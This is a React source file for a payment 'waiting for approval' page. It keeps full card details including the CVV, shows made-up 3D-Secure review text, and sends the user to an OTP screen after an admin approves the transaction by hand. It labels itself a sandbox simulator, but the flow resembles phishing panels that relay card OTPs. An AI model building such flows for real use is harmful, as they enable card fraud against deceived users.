import React, { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { ShieldCheck, Loader2, AlertCircle, HelpCircle, ExternalLink, RefreshCw } from 'lucide-react';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED';
}

export function WaitingApprovalPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const tx = location.state?.tx as Transaction | undefined;

  const [status, setStatus] = useState<'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED'>('PENDING_CARD_APPROVAL');
  const [error, setError] = useState<string | null>(null);
  const [retryCount, setRetryCount] = useState(0);

  // If no transaction in state, redirect home
  useEffect(() => {
    if (!tx || !tx.id) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Status Polling Engine
  useEffect(() => {
    if (!tx || !tx.id) return;

    let isMounted = true;
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (!res.ok) {
          throw new Error('Could not fetch transaction status');
        }
        const updatedTx = await res.json();
        
        if (isMounted) {
          setStatus(updatedTx.status);
          
          if (updatedTx.status === 'AWAITING_OTP') {
            clearInterval(interval);
            // Stagger transition slightly for professional polish
            setTimeout(() => {
              navigate('/otp', { state: { tx: updatedTx } });
            }, 800);
          } else if (updatedTx.status === 'REJECTED') {
            clearInterval(interval);
          }
        }
      } catch (err) {
        console.error('Polling error:', err);
        setError('Connection interrupted. Still attempting to re-establish secure link...');
      }
    }, 2000);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [tx, navigate]);

  if (!tx) return null;

  const isPending = status === 'PENDING_CARD_APPROVAL' || status === 'PENDING_ADMIN_APPROVAL' || status as any === 'Pending';
  const isRejected = status === 'REJECTED' || status as any === 'Rejected';

  return (
    <div id="waiting-approval-container" className="mx-auto max-w-lg px-4 py-16 flex flex-col items-center justify-center min-h-[70vh]">
      <motion.div
        initial={{ opacity: 0, y: 15 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5 }}
        className="w-full rounded-3xl border border-slate-800/80 bg-slate-900/40 p-8 backdrop-blur-xl text-center shadow-2xl shadow-indigo-950/20"
      >
        {/* Animated glowing loader */}
        <div className="relative flex items-center justify-center mb-8 h-28 w-28 mx-auto">
          {/* Pulsing ring */}
          <div className="absolute inset-0 rounded-full border border-indigo-500/10 animate-ping" />
          {/* Secondary rotating dashboard indicator */}
          <div className="absolute inset-2 rounded-full border-2 border-t-indigo-400 border-r-indigo-500/0 border-b-indigo-500/0 border-l-indigo-400/20 animate-spin" style={{ animationDuration: '3s' }} />
          {/* Main fast spinner */}
          <div className="absolute inset-4 rounded-full border-4 border-slate-800 border-t-emerald-400 animate-spin" />
          
          <ShieldCheck className="relative h-10 w-10 text-indigo-400" />
        </div>

        <h2 className="text-2xl font-bold font-sans tracking-tight text-white mb-2">
          {isRejected ? 'Transaction Declined' : 'Evaluating Secure Request'}
        </h2>
        
        <p className="text-xs font-mono text-slate-400 mb-6 uppercase tracking-widest flex items-center justify-center space-x-1.5">
          <Loader2 className="h-3 w-3 animate-spin text-emerald-400" />
          <span>TX REFERENCE: {tx.id}</span>
        </p>

        {isPending && (
          <div className="space-y-4">
            <p className="text-slate-300 text-sm leading-relaxed max-w-sm mx-auto">
              Our 3D-Secure fraud protection ledger is analyzing your card properties and routing paths. Please do not close or reload this screen.
            </p>
            
            <div className="bg-slate-950/70 border border-slate-800 p-4 rounded-xl text-left space-y-2 font-mono text-[11px] max-w-sm mx-auto">
              <div className="flex justify-between">
                <span className="text-slate-500">REQUEST VALUE:</span>
                <span className="text-white font-bold">${tx.amount.toFixed(2)}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">CARD BRAND:</span>
                <span className="text-indigo-400 uppercase font-semibold">{tx.cardType}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-slate-500">STATUS:</span>
                <span className="text-amber-400 font-bold flex items-center space-x-1 animate-pulse">
                  <span>●</span>
                  <span>PENDING REVIEW</span>
                </span>
              </div>
            </div>
          </div>
        )}

        {isRejected && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-rose-500/10 border border-rose-500/20 p-4 max-w-sm mx-auto text-rose-300 text-xs leading-relaxed">
              <div className="flex items-center space-x-2 mb-1 justify-center font-bold">
                <AlertCircle className="h-4 w-4" />
                <span>DECLINED BY ADMIN</span>
              </div>
              <span>The merchant or risk ledger rejected this authorization block. Contact your financial representative.</span>
            </div>
            
            <button
              onClick={() => navigate('/')}
              className="px-6 h-11 bg-slate-800 hover:bg-slate-700 text-white rounded-xl text-xs font-bold transition"
            >
              Return to Terminal
            </button>
          </div>
        )}

        {/* Dynamic error reconnecting message */}
        {error && (
          <div className="mt-4 text-[11px] text-rose-400 flex items-center justify-center space-x-1 bg-rose-500/5 p-2 rounded border border-rose-500/10">
            <RefreshCw className="h-3 w-3 animate-spin shrink-0" />
            <span>{error}</span>
          </div>
        )}

        {/* Sandbox Instruction Box */}
        {isPending && (
          <div className="mt-8 pt-6 border-t border-slate-800/80 text-left">
            <div className="rounded-2xl bg-indigo-500/5 border border-indigo-500/10 p-5 space-y-3">
              <div className="flex items-center space-x-2 text-indigo-400 text-xs font-bold">
                <HelpCircle className="h-4 w-4" />
                <span>SANDBOX SIMULATOR STEP</span>
              </div>
              <p className="text-[11.5px] text-slate-400 leading-relaxed">
                To proceed with this payment flow:
              </p>
              <ol className="text-[11.5px] text-slate-400 space-y-1.5 list-decimal list-inside font-sans pl-1">
                <li>Keep this tab open.</li>
                <li>
                  Open the{' '}
                  <a
                    href="#/dashboard"
                    target="_blank"
                    rel="noreferrer"
                    className="text-indigo-400 hover:text-indigo-300 underline font-semibold inline-flex items-center space-x-0.5"
                  >
                    <span>Admin Dashboard Ledger</span>
                    <ExternalLink className="h-2.5 w-2.5" />
                  </a>{' '}
                  in a new browser tab/window.
                </li>
                <li>Select pending transaction <code className="bg-slate-950 px-1 py-0.5 rounded text-indigo-300">{tx.id}</code>.</li>
                <li>Click <strong className="text-emerald-400 font-bold">APPROVE TRANSACTION</strong>. This page will update immediately!</li>
              </ol>
            </div>
          </div>
        )}
      </motion.div>
    </div>
  );
}
